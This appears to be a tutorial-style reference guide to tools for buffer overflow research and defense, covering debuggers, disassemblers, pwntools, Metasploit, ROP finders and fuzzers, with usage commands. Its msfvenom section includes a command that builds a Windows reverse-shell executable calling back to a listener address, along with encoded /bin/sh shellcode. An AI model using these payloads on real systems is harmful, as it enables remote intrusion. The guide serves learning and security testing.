# Recommended Tools for Buffer Overflow Research

## Overview

This guide covers essential tools for buffer overflow research, exploitation, and defense. From debuggers to disassemblers, these tools will help you understand, analyze, and test binary vulnerabilities.

## Debuggers

### GDB (GNU Debugger)

**The essential tool for Linux binary debugging.**

**Installation:**
```bash
# Debian/Ubuntu
sudo apt-get install gdb

# Fedora/RHEL
sudo dnf install gdb

# Arch Linux
sudo pacman -S gdb
```

**Basic Usage:**
```bash
# Start debugging
gdb ./program

# Common commands
(gdb) run                    # Run program
(gdb) run arg1 arg2          # Run with arguments
(gdb) break main             # Set breakpoint
(gdb) break *0x08048456      # Break at address
(gdb) info registers         # Show registers
(gdb) x/20wx $esp            # Examine stack
(gdb) continue               # Continue execution
(gdb) stepi                  # Step one instruction
(gdb) nexti                  # Step over call
(gdb) disassemble main       # Disassemble function
```

**Configuration:**
```bash
# Create ~/.gdbinit with:
set disassembly-flavor intel
set pagination off
set follow-fork-mode child
```

### GDB Enhancements

#### pwndbg

**Modern GDB enhancement with powerful features for exploitation.**

**Installation:**
```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**Features:**
- Enhanced disassembly
- Stack visualization
- Heap inspection
- ROP gadget finder
- Colorized output
- Context display

**Usage:**
```bash
# All pwndbg commands in GDB:
(gdb) context               # Show context (registers, stack, code)
(gdb) telescope $esp 20     # Enhanced stack view
(gdb) rop                   # Find ROP gadgets
(gdb) checksec              # Check binary protections
(gdb) vmmap                 # Show memory mappings
```

#### GEF (GDB Enhanced Features)

**Alternative to pwndbg with similar features.**

**Installation:**
```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

**Features:**
- Pattern generation
- Heap analysis
- Format string helpers
- ROP gadget search
- Automatic context display

#### PEDA (Python Exploit Development Assistance)

**Python-based GDB enhancement focused on exploitation.**

**Installation:**
```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

**Features:**
- Pattern create/offset
- Shellcode generation
- ROP gadget search
- Memory search
- Enhanced display

**Usage:**
```bash
(gdb) pattern create 200            # Generate pattern
(gdb) pattern offset 0x41414141     # Find offset
(gdb) checksec                      # Check protections
(gdb) ropgadget                     # Find ROP gadgets
(gdb) searchmem "/bin/sh"           # Search memory
```

### OllyDbg (Windows)

**Popular Windows debugger for x86 binaries.**

**Features:**
- Graphical interface
- Plugin system
- Inline assembly
- Memory search

**Download:** [OllyDbg](http://www.ollydbg.de/)

### x64dbg (Windows)

**Modern Windows debugger for x86 and x64.**

**Features:**
- Modern interface
- 64-bit support
- Plugin system
- Scripting support

**Download:** [x64dbg](https://x64dbg.com/)

## Disassemblers & Decompilers

### Ghidra

**NSA's powerful reverse engineering framework.**

**Features:**
- Decompiler (converts assembly to C-like code)
- Multi-architecture support
- Scripting (Python, Java)
- Collaborative features
- Free and open source

**Installation:**
```bash
# Download from: https://ghidra-sre.org/
# Extract and run:
./ghidraRun
```

**Usage:**
```
1. Create new project
2. Import binary
3. Analyze (auto-analysis)
4. View disassembly and decompilation
5. Navigate functions and cross-references
```

**Key Windows:**
- **Listing**: Disassembly view
- **Decompiler**: C-like pseudocode
- **Symbol Tree**: Functions and data
- **Defined Strings**: String references

### IDA (Interactive Disassembler)

**Industry-standard disassembler and debugger.**

**Versions:**
- **IDA Free**: Free version with limitations
- **IDA Pro**: Commercial version ($$$)

**Features:**
- Excellent disassembly
- Decompiler (Pro version)
- Plugin ecosystem
- Cross-references
- Graph view

**Download:** [IDA](https://hex-rays.com/ida-free/)

### radare2

**Open-source reverse engineering framework.**

**Installation:**
```bash
git clone https://github.com/radareorg/radare2
cd radare2
sys/install.sh

# Or via package manager
sudo apt-get install radare2
```

**Basic Usage:**
```bash
# Analyze binary
r2 -A ./binary

# Common commands
[0x00000000]> aaa          # Analyze all
[0x00000000]> afl          # List functions
[0x00000000]> pdf @main    # Disassemble main
[0x00000000]> s main       # Seek to main
[0x00000000]> VV           # Visual graph mode
[0x00000000]> /R pop rdi   # Search ROP gadgets
```

**Cutter (GUI for radare2):**
```bash
# Install Cutter for graphical interface
# Download from: https://cutter.re/
```

### Binary Ninja

**Modern commercial disassembler with powerful analysis.**

**Features:**
- Multiple IL (Intermediate Language) levels
- Python API
- Collaboration features
- Cross-platform

**Download:** [Binary Ninja](https://binary.ninja/)

## Binary Analysis Tools

### checksec

**Check binary security properties.**

**Installation:**
```bash
# Install pwntools (includes checksec)
pip install pwntools

# Or standalone
sudo apt-get install checksec
```

**Usage:**
```bash
checksec --file=./binary

# Output shows:
# - RELRO: Full/Partial/No
# - Stack: Canary found/No canary found
# - NX: NX enabled/NX disabled
# - PIE: PIE enabled/No PIE
# - FORTIFY: Enabled/Disabled
```

### file

**Identify file type and architecture.**

```bash
file ./binary
# Output: ELF 32-bit LSB executable, Intel 80386...

file -L ./binary  # Follow symlinks
```

### readelf

**Display ELF file information.**

```bash
# Show all headers
readelf -a ./binary

# Show program headers
readelf -l ./binary

# Show section headers
readelf -S ./binary

# Show symbols
readelf -s ./binary

# Check for NX
readelf -l ./binary | grep GNU_STACK
```

### objdump

**Display object file information.**

```bash
# Disassemble all sections
objdump -d ./binary

# Intel syntax
objdump -M intel -d ./binary

# Show all headers
objdump -x ./binary

# Show symbols
objdump -t ./binary

# Show dynamic symbols
objdump -T ./binary
```

### nm

**List symbols from object files.**

```bash
nm ./binary

# Show dynamic symbols
nm -D ./binary

# Demangle C++ names
nm -C ./binary
```

### strings

**Extract printable strings from binary.**

```bash
# Basic usage
strings ./binary

# Show location (offset)
strings -t x ./binary

# Minimum length of 10
strings -n 10 ./binary

# Search for specific string
strings ./binary | grep -i "password"
```

### ltrace

**Trace library calls.**

```bash
ltrace ./binary

# Filter specific calls
ltrace -e malloc ./binary
ltrace -e strcpy+strcat ./binary

# Save to file
ltrace -o output.txt ./binary
```

### strace

**Trace system calls.**

```bash
strace ./binary

# Follow forks
strace -f ./binary

# Filter syscalls
strace -e open,read,write ./binary

# Count calls
strace -c ./binary
```

## Exploitation Frameworks

### pwntools

**Python library for exploit development.**

**Installation:**
```bash
pip install pwntools

# Or from source
git clone https://github.com/Gallopsled/pwntools
cd pwntools
python setup.py install
```

**Example Usage:**
```python
from pwn import *

# Connect to process or remote
p = process('./binary')
# p = remote('target.com', 1337)

# Generate patterns
pattern = cyclic(200)

# Pack addresses
payload = flat([
    b"A" * 64,
    p32(0xdeadbeef)
])

# Send payload
p.sendline(payload)

# Receive output
output = p.recvline()

# Interactive shell
p.interactive()
```

**Key Features:**
- Process/remote interaction
- Assembly/disassembly
- Shellcode generation
- ROP chain building
- Pattern generation
- ELF/binary parsing

### Metasploit Framework

**Comprehensive exploitation framework.**

**Installation:**
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

**msfvenom (Payload Generator):**
```bash
# List payloads
msfvenom --list payloads

# Generate Linux shellcode
msfvenom -p linux/x86/exec CMD=/bin/sh -f c

# Generate with encoder
msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/shikata_ga_nai -f c

# Avoid bad characters
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f c

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe
```

## ROP Gadget Finders

### ROPgadget

**Find ROP gadgets in binaries.**

**Installation:**
```bash
pip install ropgadget

# Or from source
git clone https://github.com/JonathanSalwan/ROPgadget
cd ROPgadget
python setup.py install
```

**Usage:**
```bash
# Find all gadgets
ROPgadget --binary ./binary

# Search specific instruction
ROPgadget --binary ./binary --only "pop|ret"

# Filter by regex
ROPgadget --binary ./binary --regex "pop e.x"

# Generate ROP chain (automatic)
ROPgadget --binary ./binary --ropchain

# Output to file
ROPgadget --binary ./binary > gadgets.txt
```

### ropper

**Alternative ROP gadget finder with more features.**

**Installation:**
```bash
pip install ropper

# Or with Capstone support
pip install ropper[capstone]
```

**Usage:**
```bash
# Find gadgets
ropper --file ./binary

# Search gadgets
ropper --file ./binary --search "pop rdi"

# Chain generation
ropper --file ./binary --chain "execve"

# Interactive mode
ropper
(ropper)> file ./binary
(ropper)> search pop rdi
```

## Hex Editors

### hexedit

**Console hex editor.**

```bash
sudo apt-get install hexedit
hexedit ./binary
```

### xxd

**Hex dump tool (included with vim).**

```bash
# Create hex dump
xxd ./binary > binary.hex

# Reverse hex dump
xxd -r binary.hex > binary.restored

# Show only hex
xxd -p ./binary
```

### hexdump

**Display file in various formats.**

```bash
# Canonical hex+ASCII
hexdump -C ./binary

# Two-byte hexadecimal
hexdump -x ./binary

# Show first 256 bytes
hexdump -C -n 256 ./binary
```

### Bless (GUI)

**Graphical hex editor with diff capabilities.**

```bash
sudo apt-get install bless
bless ./binary
```

## Static Analysis Tools

### cppcheck

**Static analysis for C/C++.**

```bash
sudo apt-get install cppcheck

# Check all files
cppcheck --enable=all *.c

# Include warnings
cppcheck --enable=warning,style *.c
```

### flawfinder

**Security-focused static analyzer.**

```bash
pip install flawfinder

# Analyze code
flawfinder *.c

# Sort by risk
flawfinder --minlevel=3 *.c
```

### Semgrep

**Modern pattern-based static analysis.**

```bash
pip install semgrep

# Scan for vulnerabilities
semgrep --config=auto .

# Use specific ruleset
semgrep --config=p/security-audit .
```

## Dynamic Analysis Tools

### Valgrind

**Memory error detector.**

```bash
sudo apt-get install valgrind

# Check for memory errors
valgrind ./program

# Memory leak detection
valgrind --leak-check=full ./program

# Show all errors
valgrind --track-origins=yes ./program
```

### AddressSanitizer (ASan)

**Compiler-based memory error detector.**

```bash
# Compile with ASan
gcc -fsanitize=address -g program.c -o program

# Run normally
./program
# Crashes and shows detailed error on memory issues
```

### UndefinedBehaviorSanitizer (UBSan)

**Detect undefined behavior.**

```bash
gcc -fsanitize=undefined -g program.c -o program
./program
```

## Fuzzing Tools

### AFL (American Fuzzy Lop)

**Coverage-guided fuzzer.**

**Installation:**
```bash
sudo apt-get install afl++

# Or build from source
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install
```

**Usage:**
```bash
# Compile target
afl-gcc program.c -o program

# Create input directory
mkdir input
echo "test" > input/seed

# Start fuzzing
afl-fuzz -i input -o output ./program @@
```

### libFuzzer

**In-process coverage-guided fuzzer.**

```bash
# Compile with fuzzer
clang -fsanitize=fuzzer,address program.c -o program_fuzzer

# Run fuzzing
./program_fuzzer

# With corpus
./program_fuzzer corpus_dir/
```

## Utilities

### Pattern Tools

**pattern_create / pattern_offset (Metasploit):**
```bash
# Create pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41423341
```

**cyclic (pwntools):**
```python
from pwn import *

# Generate pattern
pattern = cyclic(200)

# Find offset
offset = cyclic_find(0x61616171)
```

### one_gadget

**Find exec-one-gadget ROP in libc.**

```bash
gem install one_gadget

# Find gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

### ldd

**Print shared library dependencies.**

```bash
ldd ./binary

# Example output shows libc location
```

## Container/VM Tools

### Docker

**For creating isolated testing environments.**

```bash
# Pull exploitation environment
docker pull ubuntu:20.04

# Run interactive
docker run -it -v $(pwd):/work ubuntu:20.04 /bin/bash
```

### QEMU

**Emulate different architectures.**

```bash
sudo apt-get install qemu-user qemu-user-static

# Run ARM binary on x86
qemu-arm ./arm_binary

# With GDB server
qemu-arm -g 1234 ./arm_binary
```

## Online Tools

### Compiler Explorer (godbolt.org)

**See assembly output for different compilers.**

URL: https://godbolt.org/

### Online Disassembler

**Disassemble binaries online.**

URL: https://onlinedisassembler.com/

### CyberChef

**Swiss Army knife for data encoding/decoding.**

URL: https://gchq.github.io/CyberChef/

### Shellcode Tester

URL: http://shell-storm.org/online/Online-Assembler-and-Disassembler/

## Essential Tool Combinations

### Beginner Setup
- GDB + pwndbg
- pwntools
- Ghidra
- checksec
- strings/objdump

### Intermediate Setup
- Above +
- radare2
- ROPgadget
- Valgrind
- AFL fuzzer

### Advanced Setup
- Above +
- IDA Pro
- Binary Ninja
- Frida (dynamic instrumentation)
- angr (symbolic execution)

## Quick Reference

```bash
# Analysis
file binary
checksec binary
strings binary
objdump -d binary

# Debugging
gdb binary
(gdb) run
(gdb) info registers
(gdb) x/20wx $esp

# ROP
ROPgadget --binary binary --only "pop|ret"

# Exploitation
python3 exploit.py | ./binary

# Fuzzing
afl-fuzz -i input -o output ./binary @@
```

## Learning Resources

- [GDB Tutorial](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
- [pwntools Documentation](https://docs.pwntools.com/)
- [Ghidra Documentation](https://ghidra-sre.org/CheatSheet.html)
- [ROPgadget Tutorial](https://github.com/JonathanSalwan/ROPgadget)

---

**Note**: Always use these tools ethically and legally. Only analyze and test systems you own or have explicit permission to test.

